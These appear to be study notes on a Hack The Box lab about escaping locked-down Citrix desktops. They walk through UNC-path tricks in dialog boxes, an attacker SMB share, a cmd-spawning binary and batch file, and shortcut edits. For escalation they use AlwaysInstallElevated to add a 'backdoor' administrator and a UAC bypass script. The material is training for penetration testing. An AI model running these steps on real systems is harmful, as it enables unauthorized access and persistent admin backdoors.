  - A lot of organizations leverage virtualization platforms such as Terminal Services, Citrix, AWS AppStream, CyberArk PSM and Kiosk to offer access to remote solutions. 
  - Organizations utilize a "Lock Down" measure to ensure that their desktop environments are not able to be leveraged. 

**Basic Methodology for Break-out**
1. Gain access to a `Dialog Box`.
2. Exploit the Dialog Box to achieve `command execution`.
3. `Escalate privileges` to gain higher levels of access.

-----------
### Bypassing Path Restrictions 
- When we try to access the C:\Users using File Explorer it says that it is disallowed. This is telling us that there is a group policy in place that was implemented to restrict users from browsing directories in the C:\ drive. 

![[Pasted image 20251214173638.png]]

- Many desktop applications deployed via Citrix are equipped with functionalities that enable them to interact with files on the operating system. 
- We can start by running 'MS Paint' 

![[Pasted image 20251214173749.png]]

With the windows dialog box open for paint, we can enter the [UNC](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths) path `\\127.0.0.1\c$\users\pmorgan` under the File name field, with File-Type set to `All Files` and upon hitting enter we gain access to the desired directory.

![File Explorer window open to Downloads folder, showing a single file named flag.txt. File path is \127.0.0.1\c$\users\pmorgan\Downloads. Open and Cancel buttons visible.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/67/paint_flag.png)

------------
### Accessing SMB share from Restricted Environment

Having restrictions set, File Explorer does not allow direct access to SMB shares on the attacker machine, or the Ubuntu server hosting the Citrix environment. However, by utilizing the UNC path within the Windows dialog box, it's possible to circumvent this limitation. This approach can be employed to facilitate file transfers from a different computer.

Start a SMB server from the Ubuntu machine using Impacket's `smbserver.py` script.

Citrix Breakout

```shell-session
root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Back in the Citrix environment, initiate the "Paint" application via the start menu. Proceed to navigate to the "File" menu and select "Open", thereby prompting the Dialog Box to appear. Within this Windows dialog box associated with Paint, input the UNC path as `\\10.13.38.95\share` into the designated "File name" field. Ensure that the File-Type parameter is configured to "All Files." Upon pressing the "Enter" key, entry into the share is achieved.

![File Explorer window open to network share at \10.13.38.95\share. Files listed: Bypass-UAC.ps1, Explorer++.exe, PowerUp.ps1, pwn.c, pwn.exe. Open and Cancel buttons visible.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/67/paint_share.png)

Due to the presence of restrictions within the File Explorer, direct file copying is not viable. Nevertheless, an alternative approach involves `right-clicking` on the executables and subsequently launching them. Right-click on the `pwn.exe` binary and select `Open`, which should prompt us to run it and a cmd console will be opened.

![Command prompt running pwn.exe from network share \10.13.38.95\share. Message indicates CMD.EXE started with UNC path, defaulting to Windows directory. Windows version 6.1.7601 displayed.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/67/pwn_cmd.png)

The executable `pwn.exe` is a custom compiled binary from `pwn.c` file which upon execution opens up the cmd.

Code: c

```c
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

We can then use the obtained cmd access to copy files from SMB share to pmorgans Desktop directory.

![Command prompt showing PowerShell command to bypass execution policy. File Bypass-UAC.ps1 copied from network share. Directory listing shows Bypass-UAC.ps1, evil.bat, and My_Shortcut.lnk on Desktop.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/67/xcopy.png)

---
### Alternate Explorer

- In cases where File Explorer is not a viable option, there may be alternative File System Editors like `Q-Dir` or `Explorer++` can be employed as a workaround. 

![[Pasted image 20251214174324.png]]

----
### Alternative Registry Editors
- When the Windows regex is unavailable to us, we can also use an alternative Registry Editor to make changes that bypass the standard group policy restrictions. 
- [Simpleregedit](https://sourceforge.net/projects/simpregedit/), [Uberregedit](https://sourceforge.net/projects/uberregedit/) and [SmallRegistryEditor](https://sourceforge.net/projects/sre/) are examples of such GUI tools that facilitate editing the Windows registry without being affected by the blocking imposed by group policy. These tools offer a practical and effective solution for managing registry settings in such restricted environments.

![[Pasted image 20251214174501.png]]

---------
### Modify Existing Shortcut File

- Unauthorized access to folder paths can also be achieved by modifying existing Windows shortuts and setting a desired executable's path in the Target field. 

1. `Right-click` the desired shortcut.
    
2. Select `Properties`. ![File Explorer window showing Desktop folder. Context menu open for 'My_Shortcut' with options like Open, Copy, Delete, and Properties. Shortcut size is 979 bytes.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/67/shortcut_1.png)
    
3. Within the `Target` field, modify the path to the intended folder for access. ![File Explorer window showing Desktop folder. 'My_Shortcut' properties open, displaying target type as File folder, target location as Users, and target as C:\Windows\System32\cmd.exe.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/67/shortcut_2.png)
    
4. Execute the Shortcut and cmd will be spawned ![Command prompt window titled 'My_Shortcut' showing Windows version 6.1.7601. Path displayed as C:\Users\pmorgan\Desktop.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/67/shortcut_3.png)
    

In cases where an existing shortcut file is unavailable, there are alternative methods to consider. One option is to transfer an existing shortcut file using an SMB server. Alternatively, we can create a new shortcut file using PowerShell as mentioned under [Interacting with Users section](https://academy.hackthebox.com/module/67/section/630) under `Generating a Malicious .lnk File` tab. These approaches provide versatility in achieving our objectives while working with shortcut files.


--------
### Script Execution 
- When script execution is configured to automatically execute their code using their respective interpreters, it opens the possibility of dropping a script that can serve as an interactive console or facilitate the download and launch of various third-party applications which results into bypass of restrictions in place. 

1. Create a new text file and name it "evil.bat".
2. Open "evil.bat" with a text editor such as Notepad.
3. Input the command "cmd" into the file. ![File Explorer window showing Desktop folder. Notepad open with file 'evil.bat' containing the text 'cmd'. File size is 3 bytes.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/67/script_bat.png)
4. Save the file.

Upon executing the "evil.bat" file, it will initiate a Command Prompt window. This can be useful for performing various command-line operations.

---
### Escalating Privileges
- Once we gain access to the command prompt, it is possible to use tools such as winpeas and PowerUp to identify potential security issues and vulnerabilities within the OS. 

```cmd-session
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1


C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1
```

Once more, we can make use of PowerUp, using it's `Write-UserAddMSI` function. This function facilitates the creation of an `.msi` file directly on the desktop.

Citrix Breakout

```powershell-session
PS C:\Users\pmorgan\Desktop> Import-Module .\PowerUp.ps1
PS C:\Users\pmorgan\Desktop> Write-UserAddMSI
	
Output Path
-----------
UserAdd.msi
```

Now we can execute `UserAdd.msi` and create a new user `backdoor:T3st@123` under Administrators group. Note that giving it a password that doesn’t meet the password complexity criteria will throw an error.

![File Explorer window showing Desktop. 'User Add' dialog open with fields: Username 'backdoor', Password 'T3st@123', Group 'Administrators'. Create button visible.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/67/useradd.png)

Back in CMD execute `runas` to start command prompt as the newly created `backdoor` user.

Citrix Breakout

```cmd-session
C:\> runas /user:backdoor cmd

Enter the password for backdoor: T3st@123
Attempting to start cmd as user "VDESKTOP3\backdoor" ...
```

---
### Bypassing UAC

Even though the newly established user `backdoor` is a member of `Administrators` group, accessing the `C:\users\Administrator` directory remains unfeasible due to the presence of User Account Control (UAC). UAC is a security mechanism implemented in Windows to protect the operating system from unauthorized changes. With UAC, each application that requires the administrator access token must prompt the end user for consent.

Citrix Breakout

```cmd-session
C:\Windows\system32> cd C:\Users\Administrator

Access is denied.
```

Numerous [UAC bypass](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC) scripts are available, designed to assist in circumventing the active User Account Control (UAC) mechanism. These scripts offer methods to navigate past UAC restrictions and gain elevated privileges.

Citrix Breakout

```powershell-session
PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
```

![Command prompt running as VDESKTOP3\backdoor with PowerShell bypass. Script imports Bypass-UAC.ps1 and executes UacMethodSysprep. Outputs include impersonating explorer.exe, dropping proxy DLL, and executing sysprep.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/67/bypass_uac.png)

Following a successful UAC bypass, a new powershell windows will be opened with higher privileges and we can confirm it by utilizing the command `whoami /all` or `whoami /priv`. This command provides a comprehensive view of the current user's privileges. And we can now access the Administrator directory.

![Command prompt showing directory listing of C:\Users\Administrator\Desktop with file flag.txt, size 19 bytes. 'whoami' command output: vdesktop3\backdoor.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/67/flag.png)

Note: Wait for 5 minutes after spawning the target. Disregard the licensing message.

#### Additional resources worth checking:

- [Breaking out of Citrix and other Restricted Desktop environments](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/)
- [Breaking out of Windows Environments](https://node-security.com/posts/breaking-out-of-windows-environments/)

